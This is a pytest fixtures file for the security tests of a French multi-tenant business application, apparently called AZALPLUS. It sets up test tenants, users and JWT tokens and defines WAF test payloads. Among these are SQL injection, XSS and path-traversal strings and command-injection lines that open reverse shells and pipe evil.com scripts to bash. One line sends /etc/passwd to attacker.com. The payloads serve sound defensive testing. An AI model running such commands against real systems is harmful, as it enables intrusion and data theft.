# =============================================================================
# AZALPLUS - Tests Configuration & Fixtures
# =============================================================================
"""
Configuration et fixtures partagees pour les tests de securite.

Fournit:
- Fixtures pour tenants de test
- Fixtures pour utilisateurs de test
- Fixtures pour tokens JWT
- Client de test FastAPI
"""

import pytest
import asyncio
from datetime import datetime, timedelta
from typing import Dict, Generator, Optional
from uuid import UUID, uuid4
from unittest.mock import MagicMock, patch, AsyncMock

import sys
sys.path.insert(0, "/home/ubuntu/azalplus")


# =============================================================================
# Constantes de test
# =============================================================================
TEST_TENANT_A_ID = UUID("11111111-1111-1111-1111-111111111111")
TEST_TENANT_B_ID = UUID("22222222-2222-2222-2222-222222222222")
TEST_USER_A_ID = UUID("aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa")
TEST_USER_B_ID = UUID("bbbbbbbb-bbbb-bbbb-bbbb-bbbbbbbbbbbb")
TEST_ADMIN_ID = UUID("cccccccc-cccc-cccc-cccc-cccccccccccc")

TEST_SECRET_KEY = "test_secret_key_minimum_32_characters_for_jwt"


# =============================================================================
# Pytest-asyncio configuration
# =============================================================================
# Note: Ne pas redefinir event_loop - utiliser pytest.ini ou pyproject.toml
# avec asyncio_mode = "auto" si necessaire


# =============================================================================
# Mock Settings
# =============================================================================
@pytest.fixture
def mock_settings():
    """Mock des settings pour les tests."""
    with patch("moteur.config.settings") as mock:
        mock.SECRET_KEY = TEST_SECRET_KEY
        mock.JWT_ALGORITHM = "HS256"
        mock.JWT_EXPIRE_MINUTES = 60
        mock.JWT_REFRESH_EXPIRE_DAYS = 7
        mock.AZALPLUS_ENV = "test"
        mock.DEBUG = True
        mock.RATE_LIMIT_AUTHENTICATED = 100
        mock.RATE_LIMIT_UNAUTHENTICATED = 20
        mock.RATE_LIMIT_WINDOW_SECONDS = 60
        mock.RATE_LIMIT_PREMIUM_MULTIPLIER = 3.0
        mock.ENCRYPTION_KEY = "test_encryption_key_32_chars_min!"
        yield mock


# =============================================================================
# Tenant Fixtures
# =============================================================================
@pytest.fixture
def tenant_a() -> Dict:
    """Tenant A pour tests d'isolation."""
    return {
        "id": str(TEST_TENANT_A_ID),
        "code": "TENANT_A",
        "nom": "Entreprise Test A",
        "actif": True,
        "created_at": datetime.utcnow(),
        "settings": {"plan": "standard"}
    }


@pytest.fixture
def tenant_b() -> Dict:
    """Tenant B pour tests d'isolation."""
    return {
        "id": str(TEST_TENANT_B_ID),
        "code": "TENANT_B",
        "nom": "Entreprise Test B",
        "actif": True,
        "created_at": datetime.utcnow(),
        "settings": {"plan": "premium"}
    }


# =============================================================================
# User Fixtures
# =============================================================================
@pytest.fixture
def user_tenant_a() -> Dict:
    """Utilisateur du Tenant A."""
    from moteur.auth import hash_password
    return {
        "id": TEST_USER_A_ID,
        "tenant_id": TEST_TENANT_A_ID,
        "email": "user_a@tenant-a.com",
        "nom": "User A",
        "prenom": "Test",
        "role": "user",
        "actif": True,
        "password_hash": hash_password("testpassword123"),
        "totp_enabled": False,
        "tentatives_echouees": 0,
        "derniere_connexion": None
    }


@pytest.fixture
def user_tenant_b() -> Dict:
    """Utilisateur du Tenant B."""
    from moteur.auth import hash_password
    return {
        "id": TEST_USER_B_ID,
        "tenant_id": TEST_TENANT_B_ID,
        "email": "user_b@tenant-b.com",
        "nom": "User B",
        "prenom": "Test",
        "role": "user",
        "actif": True,
        "password_hash": hash_password("testpassword456"),
        "totp_enabled": False,
        "tentatives_echouees": 0,
        "derniere_connexion": None
    }


@pytest.fixture
def admin_user() -> Dict:
    """Utilisateur admin pour tests RBAC."""
    from moteur.auth import hash_password
    return {
        "id": TEST_ADMIN_ID,
        "tenant_id": TEST_TENANT_A_ID,
        "email": "admin@tenant-a.com",
        "nom": "Admin",
        "prenom": "Test",
        "role": "admin",
        "actif": True,
        "password_hash": hash_password("adminpassword123"),
        "totp_enabled": True,
        "totp_secret": "ENCRYPTED_SECRET",
        "backup_codes": ["hash1", "hash2", "hash3"],
        "tentatives_echouees": 0,
        "derniere_connexion": None
    }


@pytest.fixture
def user_with_2fa() -> Dict:
    """Utilisateur avec 2FA active."""
    from moteur.auth import hash_password
    return {
        "id": uuid4(),
        "tenant_id": TEST_TENANT_A_ID,
        "email": "user_2fa@tenant-a.com",
        "nom": "User 2FA",
        "prenom": "Test",
        "role": "user",
        "actif": True,
        "password_hash": hash_password("2fapassword123"),
        "totp_enabled": True,
        "totp_secret": "JBSWY3DPEHPK3PXP",  # Test secret (non chiffre pour tests)
        "backup_codes": ["AAAA-BBBB", "CCCC-DDDD"],
        "tentatives_echouees": 0,
        "derniere_connexion": None
    }


# =============================================================================
# JWT Token Fixtures
# =============================================================================
@pytest.fixture
def valid_token_tenant_a(user_tenant_a, mock_settings) -> str:
    """Token JWT valide pour Tenant A."""
    from jose import jwt

    token_data = {
        "sub": str(user_tenant_a["id"]),
        "email": user_tenant_a["email"],
        "tenant_id": str(user_tenant_a["tenant_id"]),
        "role": user_tenant_a["role"],
        "exp": datetime.utcnow() + timedelta(hours=1),
        "type": "access",
        "jti": str(uuid4()),
        "iat": int(datetime.utcnow().timestamp())
    }

    return jwt.encode(token_data, TEST_SECRET_KEY, algorithm="HS256")


@pytest.fixture
def valid_token_tenant_b(user_tenant_b, mock_settings) -> str:
    """Token JWT valide pour Tenant B."""
    from jose import jwt

    token_data = {
        "sub": str(user_tenant_b["id"]),
        "email": user_tenant_b["email"],
        "tenant_id": str(user_tenant_b["tenant_id"]),
        "role": user_tenant_b["role"],
        "exp": datetime.utcnow() + timedelta(hours=1),
        "type": "access",
        "jti": str(uuid4()),
        "iat": int(datetime.utcnow().timestamp())
    }

    return jwt.encode(token_data, TEST_SECRET_KEY, algorithm="HS256")


@pytest.fixture
def expired_token(user_tenant_a, mock_settings) -> str:
    """Token JWT expire."""
    from jose import jwt

    token_data = {
        "sub": str(user_tenant_a["id"]),
        "email": user_tenant_a["email"],
        "tenant_id": str(user_tenant_a["tenant_id"]),
        "role": user_tenant_a["role"],
        "exp": datetime.utcnow() - timedelta(hours=1),  # Expire il y a 1h
        "type": "access",
        "jti": str(uuid4()),
        "iat": int((datetime.utcnow() - timedelta(hours=2)).timestamp())
    }

    return jwt.encode(token_data, TEST_SECRET_KEY, algorithm="HS256")


@pytest.fixture
def invalid_signature_token(user_tenant_a) -> str:
    """Token JWT avec signature invalide."""
    from jose import jwt

    token_data = {
        "sub": str(user_tenant_a["id"]),
        "email": user_tenant_a["email"],
        "tenant_id": str(user_tenant_a["tenant_id"]),
        "role": user_tenant_a["role"],
        "exp": datetime.utcnow() + timedelta(hours=1),
        "type": "access",
        "jti": str(uuid4()),
        "iat": int(datetime.utcnow().timestamp())
    }

    # Signe avec une mauvaise cle
    return jwt.encode(token_data, "wrong_secret_key_that_is_32_chars", algorithm="HS256")


@pytest.fixture
def refresh_token(user_tenant_a, mock_settings) -> str:
    """Token refresh valide."""
    from jose import jwt

    token_data = {
        "sub": str(user_tenant_a["id"]),
        "email": user_tenant_a["email"],
        "tenant_id": str(user_tenant_a["tenant_id"]),
        "role": user_tenant_a["role"],
        "exp": datetime.utcnow() + timedelta(days=7),
        "type": "refresh",
        "jti": str(uuid4()),
        "iat": int(datetime.utcnow().timestamp())
    }

    return jwt.encode(token_data, TEST_SECRET_KEY, algorithm="HS256")


@pytest.fixture
def pending_2fa_token(user_with_2fa, mock_settings) -> str:
    """Token en attente de validation 2FA."""
    from jose import jwt

    token_data = {
        "sub": str(user_with_2fa["id"]),
        "email": user_with_2fa["email"],
        "tenant_id": str(user_with_2fa["tenant_id"]),
        "role": user_with_2fa["role"],
        "exp": datetime.utcnow() + timedelta(minutes=5),
        "type": "pending_2fa"
    }

    return jwt.encode(token_data, TEST_SECRET_KEY, algorithm="HS256")


# =============================================================================
# Mock Database Session
# =============================================================================
@pytest.fixture
def mock_db_session():
    """Mock de session database."""
    session = MagicMock()
    session.execute = MagicMock()
    session.commit = MagicMock()
    session.rollback = MagicMock()
    session.close = MagicMock()

    return session


@pytest.fixture
def mock_database(mock_db_session):
    """Mock complet de Database."""
    with patch("moteur.db.Database") as mock_db:
        mock_db.get_session = MagicMock(return_value=mock_db_session)
        mock_db._redis = MagicMock()
        mock_db.get_redis = MagicMock(return_value=mock_db._redis)

        # Context manager support
        mock_db.get_session.return_value.__enter__ = MagicMock(return_value=mock_db_session)
        mock_db.get_session.return_value.__exit__ = MagicMock(return_value=False)

        yield mock_db


# =============================================================================
# FastAPI Test Client
# =============================================================================
@pytest.fixture
def test_app():
    """Application FastAPI de test."""
    from fastapi import FastAPI
    from fastapi.testclient import TestClient

    # Creer une app de test minimale
    app = FastAPI()

    # Importer et enregistrer les routes si necessaire
    # Pour les tests unitaires, on peut aussi mocker les routes

    return app


@pytest.fixture
def test_client(test_app):
    """Client de test FastAPI."""
    from fastapi.testclient import TestClient

    return TestClient(test_app)


# =============================================================================
# Mock Request
# =============================================================================
@pytest.fixture
def mock_request():
    """Mock de Request FastAPI."""
    request = MagicMock()
    request.state = MagicMock()
    request.headers = {}
    request.query_params = {}
    request.cookies = {}
    request.url = MagicMock()
    request.url.path = "/api/test"
    request.method = "GET"
    request.client = MagicMock()
    request.client.host = "127.0.0.1"

    return request


# =============================================================================
# WAF Test Data
# =============================================================================
@pytest.fixture
def sql_injection_payloads() -> list:
    """Payloads de test pour SQL injection."""
    return [
        "' OR '1'='1",
        "'; DROP TABLE users; --",
        "1' UNION SELECT * FROM users --",
        "admin'--",
        "1; DELETE FROM products",
        "' OR 1=1 --",
        "1' AND '1'='1",
        "'; INSERT INTO logs VALUES('hacked'); --",
        "1 OR SLEEP(5)",
        "' WAITFOR DELAY '0:0:5' --",
        "1; SELECT pg_sleep(5);--",
        "'; EXEC xp_cmdshell('dir'); --",
        "UNION ALL SELECT NULL,NULL,NULL--",
        "' HAVING 1=1 --",
        "' GROUP BY columnnames HAVING 1=1 --"
    ]


@pytest.fixture
def xss_payloads() -> list:
    """Payloads de test pour XSS."""
    return [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "javascript:alert('XSS')",
        "<iframe src='javascript:alert(1)'>",
        "<body onload=alert('XSS')>",
        "<a href='javascript:alert(1)'>click</a>",
        "'\"><script>alert('XSS')</script>",
        "<input onfocus=alert(1) autofocus>",
        "<marquee onstart=alert('XSS')>",
        "<object data='javascript:alert(1)'>",
        "<embed src='javascript:alert(1)'>",
        "data:text/html,<script>alert('XSS')</script>",
        "vbscript:msgbox('XSS')",
        "<base href='javascript:alert(1)//'>"
    ]


@pytest.fixture
def path_traversal_payloads() -> list:
    """Payloads de test pour path traversal."""
    return [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "....//....//....//etc/passwd",
        "%252e%252e%252f",
        "/etc/passwd",
        "..%2F..%2F..%2Fetc%2Fpasswd",
        "..%252f..%252f..%252fetc/passwd",
        "/proc/self/environ",
        "file:///etc/passwd"
    ]


@pytest.fixture
def command_injection_payloads() -> list:
    """Payloads de test pour command injection."""
    return [
        "; ls -la",
        "| cat /etc/passwd",
        "& whoami",
        "`id`",
        "$(whoami)",
        "|| ping -c 10 127.0.0.1",
        "&& nc -e /bin/sh 10.0.0.1 4444",
        "; curl http://evil.com/shell.sh | bash",
        "| wget http://evil.com/malware -O /tmp/m",
        "`cat /etc/shadow`",
        "$(curl http://attacker.com/exfil?data=$(cat /etc/passwd))",
        "; bash -i >& /dev/tcp/10.0.0.1/8080 0>&1"
    ]


# =============================================================================
# Rate Limiting Test Helpers
# =============================================================================
@pytest.fixture
def mock_redis_rate_limit():
    """Mock Redis pour rate limiting."""
    mock_redis = AsyncMock()
    mock_redis.zremrangebyscore = AsyncMock(return_value=None)
    mock_redis.zcard = AsyncMock(return_value=0)
    mock_redis.zadd = AsyncMock(return_value=1)
    mock_redis.expire = AsyncMock(return_value=True)
    mock_redis.zrem = AsyncMock(return_value=1)
    mock_redis.pipeline = MagicMock()
    mock_redis.pipeline.return_value.execute = AsyncMock(return_value=[None, 0, 1, True])

    return mock_redis


# =============================================================================
# Sample Data Fixtures
# =============================================================================
@pytest.fixture
def sample_client_data() -> Dict:
    """Donnees client de test."""
    return {
        "nom": "Client Test",
        "email": "client@test.com",
        "telephone": "0612345678",
        "adresse": "123 rue de Test",
        "code_postal": "75001",
        "ville": "Paris"
    }


@pytest.fixture
def sample_facture_data() -> Dict:
    """Donnees facture de test."""
    return {
        "numero": "FAC-2024-001",
        "date_facture": "2024-01-15",
        "client_id": str(uuid4()),
        "lignes": [
            {
                "designation": "Prestation",
                "quantite": 1,
                "prix_unitaire": 100.00,
                "taux_tva": 20
            }
        ],
        "total_ht": 100.00,
        "total_tva": 20.00,
        "total_ttc": 120.00
    }


# =============================================================================
# Cleanup Helpers
# =============================================================================
@pytest.fixture(autouse=True)
def cleanup_tenant_context():
    """Nettoie le contexte tenant apres chaque test."""
    yield

    # Cleanup du contexte tenant si utilise
    try:
        from moteur.tenant import TenantContext
        TenantContext.clear()
    except ImportError:
        pass


@pytest.fixture(autouse=True)
def reset_waf():
    """Reinitialise le WAF si necessaire."""
    yield

    # Le WAF est stateless donc pas de cleanup necessaire
    pass
